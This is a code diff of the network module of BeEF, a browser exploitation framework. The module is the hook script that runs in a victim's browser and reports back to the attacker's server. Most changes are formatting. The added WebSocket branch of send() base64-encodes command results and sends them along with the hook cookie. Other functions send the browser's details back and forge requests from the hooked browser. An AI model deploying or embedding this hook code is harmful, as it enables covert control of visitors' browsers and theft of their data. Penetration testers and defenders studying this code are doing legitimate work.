@@ -20,17 +20,17 @@
  */
 beef.net = {
 
-    host: "<%= @beef_host %>",
-    port: "<%= @beef_port %>",
-    hook: "<%= @beef_hook %>",
-    handler: '/dh',
-    chop: 500,
-    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
-    sid_count: 0,
-    cmd_queue: [],
+    host:"<%= @beef_host %>",
+    port:"<%= @beef_port %>",
+    hook:"<%= @beef_hook %>",
+    handler:'/dh',
+    chop:500,
+    pad:30, //this is the amount of padding for extra params such as pc, pid and sid
+    sid_count:0,
+    cmd_queue:[],
 
     //Command object
-    command: function() {
+    command:function () {
         this.cid = null;
         this.results = null;
         this.handler = null;
@@ -38,20 +38,20 @@ beef.net = {
     },
 
     //Packet object
-    packet: function() {
+    packet:function () {
         this.id = null;
         this.data = null;
     },
 
     //Stream object
-    stream: function() {
+    stream:function () {
         this.id = null;
         this.packets = [];
         this.pc = 0;
-        this.get_base_url_length = function() {
+        this.get_base_url_length = function () {
             return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
         },
-            this.get_packet_data = function() {
+            this.get_packet_data = function () {
                 var p = this.packets.shift();
                 return {'bh':beef.session.get_hook_session_id(), 'sid':this.id, 'pid':p.id, 'pc':this.pc, 'd':p.data }
             };
@@ -61,7 +61,7 @@ beef.net = {
      * Response Object - used in the beef.net.request callback
      * Note: as we are using async mode, the response object will be empty if returned.Using sync mode, request obj fields will be populated.
      */
-    response: function() {
+    response:function () {
         this.status_code = null;        // 500, 404, 200, 302
         this.status_text = null;        // success, timeout, error, ...
         this.response_body = null;      // "<html>…." if not a cross domain request
@@ -73,7 +73,7 @@ beef.net = {
     },
 
     //Queues the command, to be sent back to the framework on the next refresh
-    queue: function(handler, cid, results, callback) {
+    queue:function (handler, cid, results, callback) {
         if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
             var s = new beef.net.command();
             s.cid = cid;
@@ -85,14 +85,26 @@ beef.net = {
     },
 
     //Queues the current command and flushes the queue straight away
-    send: function(handler, cid, results, callback) {
-
-        this.queue(handler, cid, results, callback);
-        this.flush();
-      },
+    send:function (handler, cid, results, callback) {
+        if (typeof beef.websocket === "undefined") {
+            this.queue(handler, cid, results, callback);
+            this.flush();
+        }
+        else {
+            try {
+                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid + '", "result":"' + beef.encode.base64.encode(results) + '","callback": "' + callback + '","bh":"' + document.cookie.split("BEEFHOOK=")[1] + '" }');
+            }
+            catch (e) {
+                //todo this is necessary because at start could happened that ws in not still up and the browser try to send back browser info via websocket and failed
+                this.queue(handler, cid, results, callback);
+                this.flush();
+                console.log("error in send " + e);
+            }
+        }
+    },
 
     //Flush all currently queued commands to the framework
-    flush: function() {
+    flush:function () {
         if (this.cmd_queue.length > 0) {
             var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
             this.cmd_queue.length = 0;
@@ -116,13 +128,13 @@ beef.net = {
     },
 
     //Split string into chunk lengths determined by amount
-    chunk: function(str, amount) {
+    chunk:function (str, amount) {
         if (typeof amount == 'undefined') n = 2;
         return str.match(RegExp('.{1,' + amount + '}', 'g'));
     },
 
     //Push packets to framework
-    push: function(stream) {
+    push:function (stream) {
         //need to implement wait feature here eventually
         for (var i = 0; i < stream.pc; i++) {
             this.request('http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
@@ -144,20 +156,20 @@ beef.net = {
      *
      * @return: {Object} response: this object contains the response details
      */
-    request: function(scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
+    request:function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
         //check if same domain or cross domain
         var cross_domain = true;
-        if (document.domain == domain){
-            if(document.location.port == "" || document.location.port == null){
+        if (document.domain == domain) {
+            if (document.location.port == "" || document.location.port == null) {
                 cross_domain = !(port == "80" || port == "443");
             }
         }
 
         //build the url
         var url = "";
-        if(path.indexOf("http://") != -1 || path.indexOf("https://") != -1){
+        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
             url = path;
-        }else{
+        } else {
             url = scheme + "://" + domain;
             url = (port != null) ? url + ":" + port : url;
             url = (path != null) ? url + path : url;
@@ -173,30 +185,30 @@ beef.net = {
          * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
          * This will turn POSTs into GETs for remote-domain requests.
          */
-        if (method == "POST"){
-           $j.ajaxSetup({
-              dataType: dataType
-           });
-        }else{ //GET, HEAD, ...
-           $j.ajaxSetup({
-               dataType: 'script'
-           });
+        if (method == "POST") {
+            $j.ajaxSetup({
+                dataType:dataType
+            });
+        } else { //GET, HEAD, ...
+            $j.ajaxSetup({
+                dataType:'script'
+            });
         }
 
         //build and execute the request
-        $j.ajax({type: method,
-            url: url,
-            data: data,
-            timeout: (timeout * 1000),
+        $j.ajax({type:method,
+            url:url,
+            data:data,
+            timeout:(timeout * 1000),
 
             //needed otherwise jQuery always add Content-type: application/xml, even if data is populated
-            beforeSend: function(xhr) {
-                if(method == "POST"){
+            beforeSend:function (xhr) {
+                if (method == "POST") {
                     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                 }
             },
 
-            success: function(data, textStatus, xhr) {
+            success:function (data, textStatus, xhr) {
                 var end_time = new Date().getTime();
                 response.status_code = xhr.status;
                 response.status_text = textStatus;
@@ -205,14 +217,14 @@ beef.net = {
                 response.was_timedout = false;
                 response.duration = (end_time - start_time);
             },
-            error: function(jqXHR, textStatus, errorThrown) {
+            error:function (jqXHR, textStatus, errorThrown) {
                 var end_time = new Date().getTime();
                 response.response_body = jqXHR.responseText;
                 response.status_code = jqXHR.status;
                 response.status_text = textStatus;
                 response.duration = (end_time - start_time);
             },
-            complete: function(jqXHR, textStatus) {
+            complete:function (jqXHR, textStatus) {
                 response.status_code = jqXHR.status;
                 response.status_text = textStatus;
                 response.headers = jqXHR.getAllResponseHeaders();
@@ -227,11 +239,11 @@ beef.net = {
                     response.port_status = "open";
                 }
             }
-        }).done(function() {
-            if (callback != null) {
-                callback(response);
-            }
-        });
+        }).done(function () {
+                if (callback != null) {
+                    callback(response);
+                }
+            });
         return response;
     },
 
@@ -240,16 +252,16 @@ beef.net = {
      *  - requestid: needed on the callback
      *  - allowCrossDomain: set cross-domain requests as allowed or blocked
      */
-    forge_request: function(scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
+    forge_request:function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
 
         // check if same domain or cross domain
         var cross_domain = true;
         if (document.domain == domain) {
-           if(document.location.port == "" || document.location.port == null){
-              cross_domain = !(port == "80" || port == "443");
-           } else {
-              if (document.location.port == port) cross_domain = false;
-           }
+            if (document.location.port == "" || document.location.port == null) {
+                cross_domain = !(port == "80" || port == "443");
+            } else {
+                if (document.location.port == port) cross_domain = false;
+            }
         }
 
         // build the url
@@ -275,35 +287,35 @@ beef.net = {
             response.status_text = "crossdomain";
             response.port_status = "crossdomain";
             response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
-			response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
+            response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
             callback(response, requestid);
             return response;
         }
 
         // build and execute the request
-        if (method == "POST"){
-          $j.ajaxSetup({
-              data: data
-          });
+        if (method == "POST") {
+            $j.ajaxSetup({
+                data:data
+            });
         }
 
-        $j.ajax({type: method,
-            dataType: 'script', // this is required for bugs in IE so data can be transfered back to the server
-            url: url,
-            headers: headers,
-            timeout: (timeout * 1000),
+        $j.ajax({type:method,
+            dataType:'script', // this is required for bugs in IE so data can be transfered back to the server
+            url:url,
+            headers:headers,
+            timeout:(timeout * 1000),
 
             // needed otherwise jQuery always adds:
             // Content-type: application/xml
             // even if data is populated
-            beforeSend: function(xhr) {
+            beforeSend:function (xhr) {
                 if (method == "POST") {
-                   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
+                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                 }
             },
 
             // http server responded successfully
-            success: function(data, textStatus, xhr) {
+            success:function (data, textStatus, xhr) {
                 var end_time = new Date().getTime();
                 response.status_code = xhr.status;
                 response.status_text = textStatus;
@@ -314,7 +326,7 @@ beef.net = {
 
             // server responded with a http error (403, 404, 500, etc)
             // or server is not a http server
-            error: function(xhr, textStatus, errorThrown) {
+            error:function (xhr, textStatus, errorThrown) {
                 var end_time = new Date().getTime();
                 response.response_body = xhr.responseText;
                 response.status_code = xhr.status;
@@ -322,7 +334,7 @@ beef.net = {
                 response.duration = (end_time - start_time);
             },
 
-            complete: function(xhr, textStatus) {
+            complete:function (xhr, textStatus) {
                 // cross-domain request
                 if (cross_domain) {
                     response.status_code = -1;
@@ -355,7 +367,7 @@ beef.net = {
 
     //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
     //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
-    clean: function(r) {
+    clean:function (r) {
         if (this.array_has_string_key(r)) {
             var obj = {};
             for (var key in r)
@@ -366,7 +378,7 @@ beef.net = {
     },
 
     //Detects if an array has a string key
-    array_has_string_key: function(arr) {
+    array_has_string_key:function (arr) {
         if ($j.isArray(arr)) {
             try {
                 for (var key in arr)
@@ -378,7 +390,7 @@ beef.net = {
     },
 
     //Sends back browser details to framework
-    browser_details: function() {
+    browser_details:function () {
         var details = beef.browser.getDetails();
         details['HookSessionID'] = beef.session.get_hook_session_id();
         this.send('/init', 0, details);
